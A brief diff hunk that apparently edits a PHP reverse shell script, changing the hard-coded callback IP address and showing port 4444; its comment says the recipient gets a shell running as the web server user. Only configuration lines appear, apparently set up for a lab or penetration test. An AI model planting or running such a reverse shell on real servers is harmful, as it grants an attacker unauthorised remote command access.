@@ -35,7 +35,7 @@
 // The recipient will be given a shell running as the current user (apache normally).
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.0.104';  // CHANGE THIS
+$ip = '192.168.1.101';  // CHANGE THIS
 $port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
